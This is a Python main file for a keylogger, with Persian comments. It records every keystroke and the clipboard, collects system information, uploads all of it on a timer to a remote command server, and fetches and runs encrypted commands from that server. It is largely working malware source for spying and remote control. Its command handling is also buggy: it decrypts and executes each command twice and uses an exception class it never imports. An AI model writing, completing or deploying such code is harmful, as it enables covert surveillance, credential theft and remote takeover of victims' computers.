# ------------ main.py ------------
import threading
import time
import json
import logging
import sys
from keyboard import hook, add_hotkey
from config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger

class KeyloggerCore:
    def __init__(self):
        self.client_id = Config.get_client_id()
        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption)
        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
        self.running = True

    def start(self):
        self._init_hotkeys()
        self._start_service_threads()
        self._main_loop()

    def _init_hotkeys(self):
        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
        hook(self.logger.log_keystroke)

    def _start_service_threads(self):
        threading.Thread(target=self._data_sync_loop, daemon=True).start()
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()

    def _data_sync_loop(self):
        while self.running:
            try:
                # جمع‌آوری اطلاعات سیستمی
                system_info = SystemCollector.collect_full()

                # گرفتن اسکرین‌شات (نیاز به پیاده‌سازی)
                # screenshot = self._capture_screenshot()

                # ارسال داده‌ها
                self.communicator.upload_data(
                    keystrokes=self.logger.buffer.copy(),
                    system_info=system_info,
                    # screenshot=screenshot
                )

                self.logger.buffer.clear()
                time.sleep(Config.CHECK_INTERVAL)

            except Exception as e:
                self._handle_error(f"Sync error: {str(e)}")
                
    def _command_loop(self):
        while self.running:
            try:
                commands = self.communicator.fetch_commands()
                if commands:
                    self._process_commands(commands)
                time.sleep(Config.COMMAND_POLL_INTERVAL)
            except Exception as e:
                self._handle_error(f"Command processing error: {str(e)}")

    def _clipboard_monitor_loop(self):
        while self.running:
            try:
                self.logger.log_clipboard()
                time.sleep(10)
            except Exception as e:
                self._handle_error(f"Clipboard monitor error: {str(e)}")

    def _process_commands(self, commands):
        for cmd in commands:
            try:
                # اعتبارسنجی فیلدهای ضروری
                if 'type' not in cmd or 'command' not in cmd:
                    raise CommandError("Invalid command structure")

                decrypted = self.encryption.decrypt(cmd['command'])
                command_data = json.loads(decrypted)

                # اعتبارسنجی ساختار دستور
                if 'type' not in command_data:
                    raise CommandError("Missing 'type' in decrypted command")

                result = CommandHandler.execute(
                    cmd['type'],  # یا command_data['type'] بسته به طراحی
                    command_data
                )
                logging.info(f"Received command: {cmd}")  # لاگ داده خام
                decrypted = self.encryption.decrypt(cmd['command'])
                logging.info(f"Decrypted command: {decrypted}")  # لاگ داده رمزگشایی‌شده
                command_data = json.loads(decrypted)
                logging.info(f"Parsed command data: {command_data}")  # لاگ داده JSON
                result = CommandHandler.execute(
                    command_data['type'],  # اینجا از command_data استفاده می‌کنیم
                    command_data['params']
                )
                self.communicator.send_command_result(cmd['id'], result)

            except (KeyError, JSONDecodeError) as e:
                self._handle_error(f"Invalid command format: {str(e)}")
            except Exception as e:
                self._handle_error(f"Command execution failed: {str(e)}")

    def _handle_error(self, message):
        logging.error(message)

    def emergency_stop(self):
        self.running = False
        logging.info("Emergency stop activated")
        sys.exit(0)

    def _main_loop(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.emergency_stop()

if __name__ == "__main__":
    keylogger = KeyloggerCore()
    keylogger.start()